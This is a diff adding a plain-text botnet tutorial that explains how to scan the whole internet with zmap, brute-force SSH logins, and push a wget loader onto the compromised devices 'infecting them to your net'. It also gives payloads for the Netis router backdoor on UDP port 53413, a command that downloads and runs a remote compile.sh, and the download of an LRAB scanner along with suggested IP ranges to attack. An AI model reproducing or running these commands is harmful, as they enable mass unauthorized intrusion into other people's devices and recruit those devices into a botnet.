@@ -1,0 +1,110 @@
+/////////////////////
+/ ZMAP Installation /  || This is for scanning your devices
+/////////////////////
+
+wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz
+tar -xvf v2.1.0.tar.gz
+cd zmap-2.1.0
+flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"
+byacc -d -o "src/parser.c" "src/parser.y"
+mkdir /etc/zmap
+cp conf/* /etc/zmap
+cmake -DENABLE_HARDENING=ON
+make
+make install
+
+
+////////////////////
+/ How To Scan ZMAP /  || This is for scanning your devices
+////////////////////
+
+Read: below are links to the files that are needed, such as (pass_file, update, wget.pl) || In wget.pl you must change out the wget to your servers wget.
+
+zmap -p22 -w ssh.lst -o mfu.txt -B10000M          // This will allow you to scan certain IPBlocks / Ranges manually inside of a list.
+zmap -p22 -o mfu.txt -B10000M                    // This will allow you to scan the entire world. 
+chmod 777 *  					// Setting permissions for all files inside of the directory you are currently in
+./update 15000  			       // Updating your (mfu.txt) and or any other file you scanned the output to, via zmap. this will brute the devices and give you the logins to them.
+cat vuln.txt | grep -v DUP > nodups.txt       // This will cat the original vuln.txt file and get rid of all duplicate IPs and logins, whilst pushing the new output into the desired file "nodups.txt
+perl wget.pl active.txt                      // This will load the current vuln.txt list, (takes the logins, logs into the devices and runs your charline/wget infecting them to your net)
+
+cat vuln.txt | grep -v DUP > UG.txt
+cat vuln.txt | grep -v DUP > AM.txt
+
+///////////////////////
+/ NETSSH - CPAN Setup /  || This is for loading your devices
+///////////////////////
+
+yum install cpan wget curl glibc.i686 -y
+cpan force install Parallel::ForkManager
+cpan force install IO::Socket
+cpan force install IO::Select
+wget http://rbxmarketsourcealso000isbae.000webhostapp.com/compile.sh; sh compile.sh; rm -rf compile.sh
+yum install gcc php-devel php-pear libssh2 libssh2-devel libpcap -y
+pecl install -f ssh2
+touch /etc/php.d/ssh2.ini
+echo extension=ssh2.so > /etc/php.d/ssh2.ini
+cpan force install Net::SSH2
+
+//////////////////////
+/ NET:SSH2 Error Fix /
+//////////////////////
+
+yum install gcc  cpan php-pear php-devel libssh2 libssh2-devel -y
+pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo
+extension=ssh2.so>/etc/php.d/ssh2.ini
+cpan -fi Net::SSH2
+cpan -fi Parallel::ForkManager
+
+
+//////////////////
+/ CPAN Error Fix /
+//////////////////
+wget http://search.cpan.org/CPAN/authors/id/D/DL/DLUX/Parallel-ForkManager-0.7.5.tar.gz
+tar -xvf Para*
+cd Para*
+perl Makefile.PL
+make
+make install
+cd ../
+rm -rf Para*
+wget http://www.cpan.org/authors/id/S/SA/SALVA/Net-SSH2-0.59_23.tar.gz
+tar -xvf Net*
+cd Net*
+perl Makefile.PL
+make
+make install
+cd ../
+rm -rf Net*
+
+
+/ How to setup Netis /
+python -c "print 'A'*8 + 'netcore\x00'" > loginpayload
+
+python -c "print 'AA\x00\x00AAAA  WGETCOMESHERE\x00'" > commandpayload   // Change the "WGETCOMESHERE" to your payload. example below
+
+Example: python -c "print 'AA\x00\x00AAAA  WGETCOMESHERE\x00'" > commandpayload
+
+/////////////////////
+/ How to scan Netis /
+/////////////////////
+
+yum install cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
+zmap -M udp -p53413 --probe-args=file:loginpayload
+
+after it's done scanning & executing the login payload on all of them you can start executing your bins or whatnot
+Code: zmap -M udp -p53413 --probe-args=file:commandpayload
+
+
+
+
+/ How to scan LRAB /
+
+LRAB SCAN TUT
+wget -O scan.zip https://u.teknik.io/NJv2N.zip
+./class 22 -a 92 -i eth0 -s 10    // Change the "92" to your desired range c:
+./g
+./update 1200
+./dup
+perl w.pl
+
+Decent / Good ranges: ["186", "92", "122", "90", "80", "81", "82", "83", "84", "85", "86", "87"]
